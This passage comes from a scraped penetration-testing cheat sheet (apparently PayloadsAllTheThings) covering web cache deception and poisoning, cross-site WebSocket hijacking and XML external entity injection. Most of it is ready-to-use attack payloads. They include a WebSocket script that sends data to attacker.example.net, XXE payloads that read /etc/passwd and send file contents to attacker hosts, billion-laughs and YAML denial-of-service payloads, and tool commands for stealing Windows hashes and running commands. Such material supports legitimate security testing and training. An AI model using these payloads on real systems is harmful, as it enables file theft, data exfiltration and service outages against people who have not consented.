?\u0026gt; References # Writing Exploits For Exotic Bug Classes: PHP Type Juggling By Tyler Borland Magic Hashes - WhiteHatSec PHP Magic Tricks: Type Juggling spaze/hashes - Magic hashes – PHP hash \u0026ldquo;collisions\u0026rdquo; (Super) Magic Hashes - Mon 07 October 2019 - myst404 (@myst404_) "},{"id":69,"href":"/docs/web_cache_deception/","title":"Web Cache Deception","section":"Docs","content":" Web Cache Deception Attack # Tools # Param Miner - PortSwigger This extension identifies hidden, unlinked parameters. It\u0026rsquo;s particularly useful for finding web cache poisoning vulnerabilities.\nExploit # Browser requests http://www.example.com/home.php/non-existent.css. Server returns the content of http://www.example.com/home.php, most probably with HTTP caching headers that instruct to not cache this page. The response goes through the proxy. The proxy identifies that the file has a css extension. Under the cache directory, the proxy creates a directory named home.php, and caches the imposter \u0026ldquo;CSS\u0026rdquo; file (non-existent.css) inside. Methodology of the attack - example # Normal browsing, visit home : https://www.example.com/myaccount/home/ Open the malicious link : https://www.example.com/myaccount/home/malicious.css The page is displayed as /home and the cache is saving the page Open a private tab with the previous URL : https://www.paypal.com/myaccount/home/malicous.css The content of the cache is displayed Video of the attack by Omer Gil - Web Cache Deception Attack in PayPal Home Page Methodology 2 # Find an un-keyed input for a Cache Poisoning Values: User-Agent Values: Cookie Header: X-Forwarded-Host Header: X-Host Header: X-Forwarded-Server Header: X-Forwarded-Scheme (header; also in combination with X-Forwarded-Host) Header: X-Original-URL (Symfony) Header: X-Rewrite-URL (Symfony) Cache poisoning attack - Example for X-Forwarded-Host un-keyed input (remember to use a buster to only cache this webpage instead of the main page of the website) GET /test?buster=123 HTTP/1.1 Host: target.com X-Forwarded-Host: test\u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; HTTP/1.1 200 OK Cache-Control: public, no-cache [..] \u0026lt;meta property=\u0026#34;og:image\u0026#34; content=\u0026#34;https://test\u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt; References # Web Cache Deception Attack - Omer Gil Practical Web Cache Poisoning - James Kettle @albinowax Web Cache Entanglement: Novel Pathways to Poisoning - James Kettle @albinowax Web Cache Deception Attack leads to user info disclosure - Kunal pandey - Feb 25 Web cache poisoning - Web Security Academy learning materials Exploiting cache design flaws Exploiting cache implementation flaws "},{"id":70,"href":"/docs/web_sockets/","title":"Web Sockets Attacks","section":"Docs","content":" Web Sockets Attacks # The WebSocket protocol allows a bidirectional and full-duplex communication between a client and a server\nTools # ws-harness.py Using ws-harness.py # Start ws-harness to listen on a web-socket, and specify a message template to send to the endpoint.\npython ws-harness.py -u \u0026#34;ws://dvws.local:8080/authenticate-user\u0026#34; -m ./message.txt The content of the message should contains the [FUZZ] keyword.\n{\u0026#34;auth_user\u0026#34;:\u0026#34;dGVzda==\u0026#34;, \u0026#34;auth_pass\u0026#34;:\u0026#34;[FUZZ]\u0026#34;} Then you can use any tools against the newly created web service, working as a proxy and tampering on the fly the content of message sent thru the websocket.\nsqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump Cross-Site WebSocket Hijacking (CSWSH) # If the WebSocket handshake is not correctly protected using a CSRF token or a nonce, it\u0026rsquo;s possible to use the authenticated WebSocket of a user on an attacker\u0026rsquo;s controlled site because the cookies are automatically sent by the browser. This attack is called Cross-Site WebSocket Hijacking (CSWSH).\nExample exploit, hosted on an attacker\u0026rsquo;s server, that exfiltrates the received data from the WebSocket to the attacker:\n\u0026lt;script\u0026gt; ws = new WebSocket(\u0026#39;wss://vulnerable.example.com/messages\u0026#39;); ws.onopen = function start(event) { ws.send(\u0026#34;HELLO\u0026#34;); } ws.onmessage = function handleReply(event) { fetch(\u0026#39;https://attacker.example.net/?\u0026#39;+event.data, {mode: \u0026#39;no-cors\u0026#39;}); } ws.send(\u0026#34;Some text sent to the server\u0026#34;); \u0026lt;/script\u0026gt; You have to adjust the code to your exact situation. E.g. if your web application uses a Sec-WebSocket-Protocol header in the handshake request, you have to add this value as a 2nd parameter to the WebSocket function call in order to add this header.\nReferences # HACKING WEB SOCKETS: ALL WEB PENTEST TOOLS WELCOMED by Michael Fowl | Mar 5, 2019 Hacking with WebSockets - Qualys - Mike Shema, Sergey Shekyan, Vaagn Toukharian Mini WebSocket CTF - January 27, 2020 - Snowscan "},{"id":71,"href":"/docs/xxe_injection/","title":"XML eXternal Entity Injection","section":"Docs","content":" XML External Entity # An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.\nInternal Entity: If an entity is declared within a DTD it is called as internal entity. Syntax: \u0026lt;!ENTITY entity_name \u0026quot;entity_value\u0026quot;\u0026gt;\nExternal Entity: If an entity is declared outside a DTD it is called as external entity. Identified by SYSTEM. Syntax: \u0026lt;!ENTITY entity_name SYSTEM \u0026quot;entity_value\u0026quot;\u0026gt;\nTools # xxeftp - A mini webserver with FTP support for XXE payloads sudo ./xxeftp -uno 443 ./xxeftp -w -wps 5555 230-OOB - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via http://xxe.sh/ $ python3 230.py 2121 XXEinjector - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods # Enumerating /etc directory in HTTPS application: ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl # Enumerating /etc directory using gopher for OOB method: ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher # Second order exploitation: ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt # Bruteforcing files using HTTP out of band method and netdoc protocol: ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc # Enumerating using direct exploitation: ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK # Enumerating unfiltered ports: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all # Stealing Windows hashes: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes # Uploading files using Java jar: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf # Executing system commands using PHP expect: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls # Testing for XSLT injection: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt # Log requests only: ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt oxml_xxe - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF) ruby server.rb docem - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx ./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place ./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx otori - Toolbox intended to allow useful exploitation of XXE vulnerabilities. python ./otori.py --clone --module \u0026#34;G-XXE-Basic\u0026#34; --singleuri \u0026#34;file:///etc/passwd\u0026#34; --module-options \u0026#34;TEMPLATEFILE\u0026#34; \u0026#34;TARGETURL\u0026#34; \u0026#34;BASE64ENCODE\u0026#34; \u0026#34;DOCTYPE\u0026#34; \u0026#34;XMLTAG\u0026#34; --outputbase \u0026#34;./output-generic-solr\u0026#34; --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs Detect the vulnerability # Basic entity test, when the XML parser parses the external entities the result should contain \u0026ldquo;John\u0026rdquo; in firstName and \u0026ldquo;Doe\u0026rdquo; in lastName. Entities are defined inside the DOCTYPE element.\n\u0026lt;!--?xml version=\u0026#34;1.0\u0026#34; ?--\u0026gt; \u0026lt;!DOCTYPE replace [\u0026lt;!ENTITY example \u0026#34;Doe\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;userInfo\u0026gt; \u0026lt;firstName\u0026gt;John\u0026lt;/firstName\u0026gt; \u0026lt;lastName\u0026gt;\u0026amp;example;\u0026lt;/lastName\u0026gt; \u0026lt;/userInfo\u0026gt; It might help to set the Content-Type: application/xml in the request when sending XML payload to the server.\nExploiting XXE to retrieve files # Classic XXE # We try to display the content of the file /etc/passwd\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE root [\u0026lt;!ENTITY test SYSTEM \u0026#39;file:///etc/passwd\u0026#39;\u0026gt;]\u0026gt;\u0026lt;root\u0026gt;\u0026amp;test;\u0026lt;/root\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE data [ \u0026lt;!ELEMENT data (#ANY)\u0026gt; \u0026lt;!ENTITY file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;data\u0026gt;\u0026amp;file;\u0026lt;/data\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt;]\u0026gt;\u0026lt;foo\u0026gt;\u0026amp;xxe;\u0026lt;/foo\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///c:/boot.ini\u0026#34; \u0026gt;]\u0026gt;\u0026lt;foo\u0026gt;\u0026amp;xxe;\u0026lt;/foo\u0026gt; :warning: SYSTEM and PUBLIC are almost synonym.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///c:/boot.ini\u0026#34; \u0026gt;]\u0026gt;\u0026lt;foo\u0026gt;\u0026amp;xxe;\u0026lt;/foo\u0026gt; Classic XXE Base64 encoded # \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY % init SYSTEM \u0026#34;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\u0026#34;\u0026gt; %init; ]\u0026gt;\u0026lt;foo/\u0026gt; PHP Wrapper inside XXE # \u0026lt;!DOCTYPE replace [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=index.php\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;contacts\u0026gt; \u0026lt;contact\u0026gt; \u0026lt;name\u0026gt;Jean \u0026amp;xxe; Dupont\u0026lt;/name\u0026gt; \u0026lt;phone\u0026gt;00 11 22 33 44\u0026lt;/phone\u0026gt; \u0026lt;address\u0026gt;42 rue du CTF\u0026lt;/address\u0026gt; \u0026lt;zipcode\u0026gt;75000\u0026lt;/zipcode\u0026gt; \u0026lt;city\u0026gt;Paris\u0026lt;/city\u0026gt; \u0026lt;/contact\u0026gt; \u0026lt;/contacts\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY % xxe SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=http://10.0.0.3\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;foo\u0026gt;\u0026amp;xxe;\u0026lt;/foo\u0026gt; XInclude attacks # When you can\u0026rsquo;t modify the DOCTYPE element use the XInclude to target\n\u0026lt;foo xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34;\u0026gt; \u0026lt;xi:include parse=\u0026#34;text\u0026#34; href=\u0026#34;file:///etc/passwd\u0026#34;/\u0026gt;\u0026lt;/foo\u0026gt; Exploiting XXE to perform SSRF attacks # XXE can be combined with the SSRF vulnerability to target another service on the network.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY % xxe SYSTEM \u0026#34;http://internal.service/secret_pass.txt\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;foo\u0026gt;\u0026amp;xxe;\u0026lt;/foo\u0026gt; Exploiting XXE to perform a deny of service # :warning: : These attacks might kill the service or the server, do not use them on the production.\nBillion Laugh Attack # \u0026lt;!DOCTYPE data [ \u0026lt;!ENTITY a0 \u0026#34;dos\u0026#34; \u0026gt; \u0026lt;!ENTITY a1 \u0026#34;\u0026amp;a0;\u0026amp;a0;\u0026amp;a0;\u0026amp;a0;\u0026amp;a0;\u0026amp;a0;\u0026amp;a0;\u0026amp;a0;\u0026amp;a0;\u0026amp;a0;\u0026#34;\u0026gt; \u0026lt;!ENTITY a2 \u0026#34;\u0026amp;a1;\u0026amp;a1;\u0026amp;a1;\u0026amp;a1;\u0026amp;a1;\u0026amp;a1;\u0026amp;a1;\u0026amp;a1;\u0026amp;a1;\u0026amp;a1;\u0026#34;\u0026gt; \u0026lt;!ENTITY a3 \u0026#34;\u0026amp;a2;\u0026amp;a2;\u0026amp;a2;\u0026amp;a2;\u0026amp;a2;\u0026amp;a2;\u0026amp;a2;\u0026amp;a2;\u0026amp;a2;\u0026amp;a2;\u0026#34;\u0026gt; \u0026lt;!ENTITY a4 \u0026#34;\u0026amp;a3;\u0026amp;a3;\u0026amp;a3;\u0026amp;a3;\u0026amp;a3;\u0026amp;a3;\u0026amp;a3;\u0026amp;a3;\u0026amp;a3;\u0026amp;a3;\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;data\u0026gt;\u0026amp;a4;\u0026lt;/data\u0026gt; Yaml attack # a: \u0026amp;a [\u0026#34;lol\u0026#34;,\u0026#34;lol\u0026#34;,\u0026#34;lol\u0026#34;,\u0026#34;lol\u0026#34;,\u0026#34;lol\u0026#34;,\u0026#34;lol\u0026#34;,\u0026#34;lol\u0026#34;,\u0026#34;lol\u0026#34;,\u0026#34;lol\u0026#34;] b: \u0026amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a] c: \u0026amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b] d: \u0026amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c] e: \u0026amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d] f: \u0026amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e] g: \u0026amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f] h: \u0026amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g] i: \u0026amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h] Error Based XXE # Payload to trigger the XXE\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE message [ \u0026lt;!ENTITY % ext SYSTEM \u0026#34;http://attacker.com/ext.dtd\u0026#34;\u0026gt; %ext; ]\u0026gt; \u0026lt;message\u0026gt;\u0026lt;/message\u0026gt; Contents of ext.dtd\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; error SYSTEM \u0026#39;file:///nonexistent/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %error; Exploiting blind XXE to exfiltrate data out-of-band # Sometimes you won\u0026rsquo;t have a result outputted in the page but you can still extract the data with an out of band attack.\nBlind XXE # The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % ext SYSTEM \u0026#34;http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x\u0026#34;\u0026gt; %ext; ]\u0026gt; \u0026lt;r\u0026gt;\u0026lt;/r\u0026gt; Send the content of /etc/passwd to \u0026ldquo;www.malicious.com\u0026rdquo;, you may receive only the first line.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY % xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt; \u0026lt;!ENTITY callhome SYSTEM \u0026#34;www.malicious.com/?%xxe;\u0026#34;\u0026gt; ] \u0026gt; \u0026lt;foo\u0026gt;\u0026amp;callhome;\u0026lt;/foo\u0026gt; XXE OOB Attack # \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE data SYSTEM \u0026#34;http://publicServer.com/parameterEntity_oob.dtd\u0026#34;\u0026gt; \u0026lt;data\u0026gt;\u0026amp;send;\u0026lt;/data\u0026gt; File stored on http://publicServer.com/parameterEntity_oob.dtd \u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///sys/power/image_size\u0026#34;\u0026gt; \u0026lt;!ENTITY % all \u0026#34;\u0026lt;!ENTITY send SYSTEM \u0026#39;http://publicServer.com/?%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %all; XXE OOB with DTD and PHP filter # \u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE r [ \u0026lt;!ELEMENT r ANY \u0026gt; \u0026lt;!ENTITY % sp SYSTEM \u0026#34;http://127.0.0.1/dtd.xml\u0026#34;\u0026gt; %sp; %param1; ]\u0026gt; \u0026lt;r\u0026gt;\u0026amp;exfil;\u0026lt;/r\u0026gt; File stored on http://127.0.0.1/dtd.xml \u0026lt;!ENTITY % data SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=/etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % param1 \u0026#34;\u0026lt;!ENTITY exfil SYSTEM \u0026#39;http://127.0.0.1/dtd.xml?%data;\u0026#39;\u0026gt;\u0026#34;\u0026gt; XXE OOB with Apache Karaf # CVE-2018-11788 affecting versions:\nApache Karaf \u0026lt;= 4.2.1 Apache Karaf \u0026lt;= 4.1.6 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE doc [\u0026lt;!ENTITY % dtd SYSTEM \u0026#34;http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com\u0026#34;\u0026gt; %dtd;] \u0026lt;features name=\u0026#34;my-features\u0026#34; xmlns=\u0026#34;http://karaf.apache.org/xmlns/features/v1.3.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\u0026#34;\u0026gt; \u0026lt;feature name=\u0026#34;deployer\u0026#34; version=\u0026#34;2.0\u0026#34; install=\u0026#34;auto\u0026#34;\u0026gt; \u0026lt;/feature\u0026gt; \u0026lt;/features\u0026gt; Send the XML file to the deploy folder.\nRef. brianwrf/CVE-2018-11788\nXXE with local DTD # In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this:\n\u0026lt;!DOCTYPE root [\u0026lt;!ENTITY test SYSTEM \u0026#39;http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net\u0026#39;\u0026gt;]\u0026gt; \u0026lt;root\u0026gt;\u0026amp;test;\u0026lt;/root\u0026gt; If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.\n\u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % local_dtd SYSTEM \u0026#34;file:///abcxyz/\u0026#34;\u0026gt; %local_dtd; ]\u0026gt; \u0026lt;root\u0026gt;\u0026lt;/root\u0026gt; Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message.\n\u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % local_dtd SYSTEM \u0026#34;file:///usr/share/yelp/dtd/docbookx.dtd\u0026#34;\u0026gt; \u0026lt;!ENTITY % ISOamsa \u0026#39; \u0026lt;!ENTITY \u0026amp;#x25; file SYSTEM \u0026#34;file:///REPLACE_WITH_FILENAME_TO_READ\u0026#34;\u0026gt; \u0026lt;!ENTITY \u0026amp;#x25; eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x26;#x25; error SYSTEM \u0026amp;#x27;file:///abcxyz/\u0026amp;#x25;file;\u0026amp;#x27;\u0026gt;\u0026#34;\u0026gt; \u0026amp;#x25;eval; \u0026amp;#x25;error; \u0026#39;\u0026gt; %local_dtd; ]\u0026gt; \u0026lt;root\u0026gt;\u0026lt;/root\u0026gt; Other payloads using different DTDs\nWindows Local DTD and Side Channel Leak to disclose HTTP response/file contents # From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79\nDisclose local file # \u0026lt;!DOCTYPE doc [ \u0026lt;!ENTITY % local_dtd SYSTEM \u0026#34;file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\u0026#34;\u0026gt; \u0026lt;!ENTITY % SuperClass \u0026#39;\u0026gt; \u0026lt;!ENTITY \u0026amp;#x25; file SYSTEM \u0026#34;file://D:\\webserv2\\services\\web.config\u0026#34;\u0026gt; \u0026lt;!ENTITY \u0026amp;#x25; eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x26;#x25; error SYSTEM \u0026amp;#x27;file://t/#\u0026amp;#x25;file;\u0026amp;#x27;\u0026gt;\u0026#34;\u0026gt; \u0026amp;#x25;eval; \u0026amp;#x25;error; \u0026lt;!ENTITY test \u0026#34;test\u0026#34;\u0026#39; \u0026gt; %local_dtd; ]\u0026gt;\u0026lt;xxx\u0026gt;cacat\u0026lt;/xxx\u0026gt; Disclose HTTP Response: # \u0026lt;!DOCTYPE doc [ \u0026lt;!ENTITY % local_dtd SYSTEM \u0026#34;file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\u0026#34;\u0026gt; \u0026lt;!ENTITY % SuperClass \u0026#39;\u0026gt; \u0026lt;!ENTITY \u0026amp;#x25; file SYSTEM \u0026#34;https://erp.company.com\u0026#34;\u0026gt; \u0026lt;!ENTITY \u0026amp;#x25; eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x26;#x25; error SYSTEM \u0026amp;#x27;file://test/#\u0026amp;#x25;file;\u0026amp;#x27;\u0026gt;\u0026#34;\u0026gt; \u0026amp;#x25;eval; \u0026amp;#x25;error; \u0026lt;!ENTITY test \u0026#34;test\u0026#34;\u0026#39; \u0026gt; %local_dtd; ]\u0026gt;\u0026lt;xxx\u0026gt;cacat\u0026lt;/xxx\u0026gt; XXE in exotic files # XXE inside SVG # \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34; width=\u0026#34;300\u0026#34; version=\u0026#34;1.1\u0026#34; height=\u0026#34;200\u0026#34;\u0026gt; \u0026lt;image xlink:href=\u0026#34;expect://ls\u0026#34; width=\u0026#34;200\u0026#34; height=\u0026#34;200\u0026#34;\u0026gt;\u0026lt;/image\u0026gt; \u0026lt;/svg\u0026gt; Classic\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/hostname\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;svg width=\u0026#34;128px\u0026#34; height=\u0026#34;128px\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34; version=\u0026#34;1.1\u0026#34;\u0026gt; \u0026lt;text font-size=\u0026#34;16\u0026#34; x=\u0026#34;0\u0026#34; y=\u0026#34;16\u0026#34;\u0026gt;\u0026amp;xxe;\u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; OOB via SVG rasterization\nxxe.svg\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE svg [ \u0026lt;!ELEMENT svg ANY \u0026gt; \u0026lt;!ENTITY % sp SYSTEM \u0026#34;http://example.org:8080/xxe.xml\u0026#34;\u0026gt; %sp; %param1; ]\u0026gt; \u0026lt;svg viewBox=\u0026#34;0 0 200 200\u0026#34; version=\u0026#34;1.2\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; style=\u0026#34;fill:red\u0026#34;\u0026gt; \u0026lt;text x=\u0026#34;15\u0026#34; y=\u0026#34;100\u0026#34; style=\u0026#34;fill:black\u0026#34;\u0026gt;XXE via SVG rasterization\u0026lt;/text\u0026gt; \u0026lt;rect x=\u0026#34;0\u0026#34; y=\u0026#34;0\u0026#34; rx=\u0026#34;10\u0026#34; ry=\u0026#34;10\u0026#34; width=\u0026#34;200\u0026#34; height=\u0026#34;200\u0026#34; style=\u0026#34;fill:pink;opacity:0.7\u0026#34;/\u0026gt; \u0026lt;flowRoot font-size=\u0026#34;15\u0026#34;\u0026gt; \u0026lt;flowRegion\u0026gt; \u0026lt;rect x=\u0026#34;0\u0026#34; y=\u0026#34;0\u0026#34; width=\u0026#34;200\u0026#34; height=\u0026#34;200\u0026#34; style=\u0026#34;fill:red;opacity:0.3\u0026#34;/\u0026gt; \u0026lt;/flowRegion\u0026gt; \u0026lt;flowDiv\u0026gt; \u0026lt;flowPara\u0026gt;\u0026amp;exfil;\u0026lt;/flowPara\u0026gt; \u0026lt;/flowDiv\u0026gt; \u0026lt;/flowRoot\u0026gt; \u0026lt;/svg\u0026gt; xxe.xml\n\u0026lt;!ENTITY % data SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=/etc/hostname\u0026#34;\u0026gt; \u0026lt;!ENTITY % param1 \u0026#34;\u0026lt;!ENTITY exfil SYSTEM \u0026#39;ftp://example.org:2121/%data;\u0026#39;\u0026gt;\u0026#34;\u0026gt; XXE inside SOAP # \u0026lt;soap:Body\u0026gt; \u0026lt;foo\u0026gt; \u0026lt;![CDATA[\u0026lt;!DOCTYPE doc [\u0026lt;!ENTITY % dtd SYSTEM \u0026#34;http://x.x.x.x:22/\u0026#34;\u0026gt; %dtd;]\u0026gt;\u0026lt;xxx/\u0026gt;]]\u0026gt; \u0026lt;/foo\u0026gt; \u0026lt;/soap:Body\u0026gt; XXE inside DOCX file # Format of an Open XML file (inject the payload in any .xml file):\n/_rels/.rels [Content_Types].xml Default Main Document Part /word/document.xml /ppt/presentation.xml /xl/workbook.xml Then update the file zip -u xxe.docx [Content_Types].xml\nTool : https://github.com/BuffaloWill/oxml_xxe\nDOCX/XLSX/PPTX ODT/ODG/ODP/ODS SVG XML PDF (experimental) JPG (experimental) GIF (experimental) XXE inside XLSX file # Structure of the XLSX:\n$ 7z l xxe.xlsx [...] Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2021-10-17 15:19:00 ..... 578 223 _rels/.rels 2021-10-17 15:19:00 ..... 887 508 xl/workbook.xml 2021-10-17 15:19:00 ..... 4451 643 xl/styles.xml 2021-10-17 15:19:00 ..... 2042 899 xl/worksheets/sheet1.xml 2021-10-17 15:19:00 ..... 549 210 xl/_rels/workbook.xml.rels 2021-10-17 15:19:00 ..... 201 160 xl/sharedStrings.xml 2021-10-17 15:19:00 ..... 731 352 docProps/core.xml 2021-10-17 15:19:00 ..... 410 246 docProps/app.xml 2021-10-17 15:19:00 ..... 1367 345 [Content_Types].xml ------------------- ----- ------------ ------------ ------------------------ 2021-10-17 15:19:00 11216 3586 9 files Extract Excel file: 7z x -oXXE xxe.xlsx\nRebuild Excel file:\n$ cd XXE $ 7z u ../xxe.xlsx * Add your blind XXE payload inside xl/workbook.xml.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE cdl [\u0026lt;!ELEMENT cdl ANY \u0026gt;\u0026lt;!ENTITY % asd SYSTEM \u0026#34;http://x.x.x.x:8000/xxe.dtd\u0026#34;\u0026gt;%asd;%c;]\u0026gt; \u0026lt;cdl\u0026gt;\u0026amp;rrr;\u0026lt;/cdl\u0026gt; \u0026lt;workbook xmlns=\u0026#34;http://schemas.openxmlformats.org/spreadsheetml/2006/main\u0026#34; xmlns:r=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships\u0026#34;\u0026gt; Alternativly, add your payload in xl/sharedStrings.xml:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE cdl [\u0026lt;!ELEMENT t ANY \u0026gt;\u0026lt;!ENTITY % asd SYSTEM 